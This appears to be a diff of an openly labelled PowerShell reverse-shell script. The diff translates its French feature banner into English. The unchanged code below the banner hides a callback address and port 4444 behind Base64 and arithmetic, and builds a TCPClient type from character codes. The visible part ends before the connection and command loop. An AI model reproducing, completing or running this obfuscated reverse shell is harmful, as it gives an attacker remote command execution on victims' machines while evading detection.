@@ -1,15 +1,18 @@
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "PowerShell Reverse Shell" -ForegroundColor Yellow
-Write-Host "Developpe par Florent Vinai" -ForegroundColor Green
+Write-Host "Developed by Florent Vinai" -ForegroundColor Green
 Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "#D�obfuscation dynamique (Base64 + char arrays)" -ForegroundColor Yellow
-Write-Host "Construction � la vol�e d�objets .NET via r�flexion" -ForegroundColor Yellow
-Write-Host "Ouverture d’un flux TCP et échange de données par Stream" -ForegroundColor Yellow
-Write-Host "Exécution locale de commandes reçues sur un canal réseau" -ForegroundColor Yellow
-Write-Host "Gestion d’un interpréteur PowerShell embarqué (runspace)" -ForegroundColor Yellow
-Write-Host "Nettoyage automatique des flux et ressources .NET" -ForegroundColor Yellow
+
+Write-Host "-Dynamic deobfuscation (Base64 + char arrays)" -ForegroundColor Yellow
+Write-Host "-On-the-fly construction of .NET objects via reflection" -ForegroundColor Yellow
+Write-Host "-TCP stream creation and data exchange over NetworkStream" -ForegroundColor Yellow
+Write-Host "-Local execution of commands received over the network" -ForegroundColor Yellow
+Write-Host "-Embedded PowerShell runspace interpreter handling" -ForegroundColor Yellow
+Write-Host "-Automatic cleanup of streams and .NET resources" -ForegroundColor Yellow
+
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
+
 $K7mP3 = [Convert]::FromBase64String('MTkyLjE2OC4xLjEwMA=='); $H4xQ2 = -join [char[]]$K7mP3;
 $N9vR5 = [int]([Math]::Pow(2,2) + [Math]::Pow(2,3) + [Math]::Pow(2,4) + [Math]::Pow(2,6) + [Math]::Pow(2,8) + [Math]::Pow(2,12));
 $TpCl = ([Type](([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]78+[char]101+[char]116+[char]46+[char]83+[char]111+[char]99+[char]107+[char]101+[char]116+[char]115+[char]46+[char]84+[char]67+[char]80+[char]67+[char]108+[char]105+[char]101+[char]110+[char]116)));
